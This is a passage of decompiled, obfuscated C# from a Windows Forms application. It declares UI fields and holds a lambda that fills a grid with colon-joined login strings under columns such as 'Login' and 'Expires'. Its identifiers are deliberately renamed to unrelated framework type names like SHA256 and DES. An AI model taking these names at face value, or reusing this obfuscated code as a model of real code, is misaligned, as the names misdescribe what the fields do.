		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[AccessedThroughProperty("Panel14")]
		private Panel IStackWalk;

		[CompilerGenerated]
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[AccessedThroughProperty("Label17")]
		private Label ConstructorBuilder;

		[CompilerGenerated]
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[AccessedThroughProperty("Label18")]
		private Label SHA256;

		[CompilerGenerated]
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[AccessedThroughProperty("Label20")]
		private Label Entry;

		[CompilerGenerated]
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[AccessedThroughProperty("Label22")]
		private Label ServerException;

		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[AccessedThroughProperty("Label23")]
		[CompilerGenerated]
		private Label SECURITYLOGONSESSIONDATA;

		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[AccessedThroughProperty("Label24")]
		[CompilerGenerated]
		private Label InternalEncoderBestFitFallbackBuffer;

		[CompilerGenerated]
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[AccessedThroughProperty("Label37")]
		private Label PublisherMembershipCondition;

		[CompilerGenerated]
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[AccessedThroughProperty("Label38")]
		private Label MscorlibDictionaryValueCollectionDebugView2;

		[CompilerGenerated]
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[AccessedThroughProperty("Label16")]
		private Label _Label16;

		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[AccessedThroughProperty("Label15")]
		[CompilerGenerated]
		private Label RegistryAuditRule;

		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[AccessedThroughProperty("Label14")]
		[CompilerGenerated]
		private Label ThreadPriority;

		[CompilerGenerated]
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[AccessedThroughProperty("Label13")]
		private Label FlagsAttribute;

		[CompilerGenerated]
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[AccessedThroughProperty("Label12")]
		private Label IFormatterConverter;

		[CompilerGenerated]
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[AccessedThroughProperty("Label11")]
		private Label UIPermissionWindow;

		[CompilerGenerated]
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[AccessedThroughProperty("Label10")]
		private Label FromBase64Transform;

		[CompilerGenerated]
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[AccessedThroughProperty("Label9")]
		private Label CommonSecurityDescriptorNumberFormatInfo;

		[CompilerGenerated]
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[AccessedThroughProperty("MetroComboBox1")]
		private MetroComboBox SurrogateForCyclicalReference;

		[AccessedThroughProperty("Panel16")]
		[CompilerGenerated]
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		private Panel IBindCtx;

		[CompilerGenerated]
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[AccessedThroughProperty("PictureBox2")]
		private PictureBox ObjRef;

		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[AccessedThroughProperty("MetroLabel6")]
		[CompilerGenerated]
		private MetroLabel IContextPropertyActivator;

		[CompilerGenerated]
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[AccessedThroughProperty("PictureBox5")]
		private PictureBox WhatsCached;

		[CompilerGenerated]
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[AccessedThroughProperty("PictureBox1")]
		private PictureBox IEnumerator1;

		[CompilerGenerated]
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[AccessedThroughProperty("PictureBox3")]
		private PictureBox IMethodReturnMessage;

		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[AccessedThroughProperty("PictureBox4")]
		[CompilerGenerated]
		private PictureBox TypeDependencyAttribute;

		[CompilerGenerated]
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[AccessedThroughProperty("Panel15")]
		private Panel Comparer1PseudoCustomAttribute;

		[AccessedThroughProperty("Panel8")]
		[CompilerGenerated]
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		private Panel IsBoxed;

		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[AccessedThroughProperty("Panel13")]
		[CompilerGenerated]
		private Panel ComRegisterFunctionAttribute;

		[AccessedThroughProperty("MetroTextbox1")]
		[CompilerGenerated]
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		private MetroTextbox RegistryPermissionAttribute;

		[CompilerGenerated]
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[AccessedThroughProperty("Panel5")]
		private Panel Cer;

		[AccessedThroughProperty("MetroTrackbar2")]
		[CompilerGenerated]
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		private MetroTrackbar IEnumerator1CallingConvention;

		[CompilerGenerated]
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[AccessedThroughProperty("MetroTrackbar1")]
		private MetroTrackbar CLSCompliantAttribute;

		[CompilerGenerated]
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[AccessedThroughProperty("MetroLabel5")]
		private MetroLabel IEnumDefinitionIdentity;

		[CompilerGenerated]
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[AccessedThroughProperty("MetroChecker3")]
		private MetroChecker AttributeTargetsCultureInfo;

		[CompilerGenerated]
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[AccessedThroughProperty("MetroTrackbar3")]
		private MetroTrackbar FromBase64TransformModeIMessageCtrl;

		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[AccessedThroughProperty("PictureBox10")]
		[CompilerGenerated]
		private PictureBox FileSystemAuditRule;

		[CompilerGenerated]
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[AccessedThroughProperty("PictureBox11")]
		private PictureBox IUnknownSafeHandle;

		[CompilerGenerated]
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[AccessedThroughProperty("MetroChecker4")]
		private ScopeTreeLCIDConversionAttribute ConsoleStream;

		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[AccessedThroughProperty("Panel17")]
		[CompilerGenerated]
		private Panel TypeLibTypeAttribute;

		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[AccessedThroughProperty("PictureBox6")]
		[CompilerGenerated]
		private PictureBox _PictureBox6;

		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[AccessedThroughProperty("PictureBox7")]
		[CompilerGenerated]
		private PictureBox IdnMapping;

		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[AccessedThroughProperty("Panel18")]
		[CompilerGenerated]
		private Panel IMuiResourceTypeIdStringEntry;

		[CompilerGenerated]
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[AccessedThroughProperty("MetroTrackbar4")]
		private MetroTrackbar Evidence;

		[CompilerGenerated]
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[AccessedThroughProperty("MetroLabel7")]
		private MetroLabel StringFreezingAttribute;

		[CompilerGenerated]
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[AccessedThroughProperty("MetroChecker9")]
		private MetroChecker Normalization;

		[AccessedThroughProperty("MetroChecker10")]
		[CompilerGenerated]
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		private MetroChecker WhatsCachedTextInfoDataHeader;

		[CompilerGenerated]
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[AccessedThroughProperty("MetroChecker8")]
		private MetroChecker DecoratedNameAttribute;

		[CompilerGenerated]
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[AccessedThroughProperty("MetroChecker7")]
		private MetroChecker CerDateMapping;

		[CompilerGenerated]
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[AccessedThroughProperty("MetroChecker6")]
		private MetroChecker ICategoryMembershipEntry;

		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[AccessedThroughProperty("MetroChecker5")]
		[CompilerGenerated]
		private MetroChecker PaddingMode;

		[CompilerGenerated]
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[AccessedThroughProperty("Panel19")]
		private Panel FileEntryFieldId;

		[CompilerGenerated]
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[AccessedThroughProperty("Timer2")]
		private System.Windows.Forms.Timer RSAPKCS1SignatureDeformatterDateTimeFormatInfoScanner;

		[CompilerGenerated]
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[AccessedThroughProperty("MetroButton7")]
		private IExpando BaseChannelObjectWithProperties;

		[CompilerGenerated]
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[AccessedThroughProperty("Login")]
		private DataGridViewTextBoxColumn EncodingCharBufferConsoleCancelEventArgs;

		[AccessedThroughProperty("Column1")]
		[CompilerGenerated]
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		private DataGridViewTextBoxColumn IContextAttribute;

		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[AccessedThroughProperty("Column2")]
		[CompilerGenerated]
		private DataGridViewTextBoxColumn MemoryFailPoint;

		[AccessedThroughProperty("Column4")]
		[CompilerGenerated]
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		private DataGridViewTextBoxColumn GacMembershipCondition;

		[CompilerGenerated]
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[AccessedThroughProperty("Column5")]
		private DataGridViewTextBoxColumn ProxyAttribute;

		[AccessedThroughProperty("Expires")]
		[CompilerGenerated]
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		private DataGridViewTextBoxColumn IContributeClientContextSink;

		[CompilerGenerated]
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[AccessedThroughProperty("Column3")]
		private DataGridViewTextBoxColumn AuthorizationRule;

		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[AccessedThroughProperty("PictureBox12")]
		[CompilerGenerated]
		private PictureBox BLOB;

		[CompilerGenerated]
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[AccessedThroughProperty("PictureBox13")]
		private PictureBox MessageEnd;

		[CompilerGenerated]
		internal sealed class DictionaryEnumeratorByKeys
		{
			public string HebrewToken;

			public string ServerChannelSinkStack;

			public ISection ObjectCreationDelegateSoapInteger;
		}

		[CompilerGenerated]
		internal sealed class ISCIIEncoder
		{
			internal void _Lambda$__0()
			{
				this.ISecurableChannelNeutralResourcesLanguageAttribute.ObjectCreationDelegateSoapInteger.RuntimeEventInfo.Rows.Add(new object[]
				{
					this.ISecurableChannelNeutralResourcesLanguageAttribute.HebrewToken + ":" + this.ISecurableChannelNeutralResourcesLanguageAttribute.ServerChannelSinkStack,
					this.IInternalMessage,
					this.DES,
					this.string_0,
					this.OverlappedDataCacheBaseChannelSinkWithProperties,
					this.PermissionToken,
					this.RemotingSurrogateSelector
				});
			}

			public string IInternalMessage;

			public string DES;

			public string string_0;

			public string OverlappedDataCacheBaseChannelSinkWithProperties;

			public string PermissionToken;

			public string RemotingSurrogateSelector;

			public ISection.DictionaryEnumeratorByKeys ISecurableChannelNeutralResourcesLanguageAttribute;
		}
	}
}
